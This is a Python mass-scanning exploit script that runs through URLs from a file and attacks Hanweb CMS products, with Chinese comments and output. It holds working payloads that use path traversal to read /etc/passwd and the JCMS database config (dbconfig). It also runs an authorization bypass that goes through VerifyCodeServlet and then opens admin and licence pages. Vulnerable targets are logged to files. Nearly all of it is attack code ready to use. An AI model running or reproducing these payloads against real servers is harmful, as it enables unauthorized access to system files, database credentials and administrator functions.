import sys
import json
import requests
import warnings


urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    #任意文件下载
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/vc/vc/columncount/downfile.jsp?savename=a.txt&filename=../../../../../../../../etc/passwd"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=2, verify=False)
        if r"root:" in req.text and r"/bin/bash" in req.text:
            print("[+]存在大汉downfile.jsp 任意文件下载漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('任意文件下载.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在hanweb_downfile_filedownload漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
#配置文件读取漏洞
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/jcms/workflow/design/readxml.jsp?flowcode=../../../WEB-INF/config/dbconfig"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

        if r"<driver-properties>" in req.text:
            print("[+]存在大汉版通JCMS数据库读取漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('配置文件读取漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在hanweb_readxml_fileread漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
#越权漏洞
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    paths = ['/vipchat/', '/jcms/', '/jsearch/', '/jact/', '/vc/', '/xxgk/']
    payload = 'VerifyCodeServlet?var=cookie_username'
    adminpaths = ['setup/opr_licenceinfo.jsp', 'setup/admin.jsp']
    sess = requests.Session()
    try:
        for path in paths:
            vulnurl = url + path + payload
            req = sess.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200:
                for adminpath in adminpaths:
                    adminurl = url + path + adminpath
                    req2 = sess.get(adminurl, headers=headers, timeout=10, verify=False)
                    if req2.status_code == 200 and ('Licence' in req2.text or 'admin' in req2.text):
                        print("[+]存在大汉VerfiyCodeServlet越权漏洞...(高危)\tpayload: " + "1.先访问" + vulnurl + "\t2.再访问" + adminurl,"red")
                        with open('越权漏洞.txt', 'a')as f:
                            f.write(str(vulnurl) + '\n')
                    else:
                        print("[-]不存在hanweb_VerifyCodeServlet_install漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")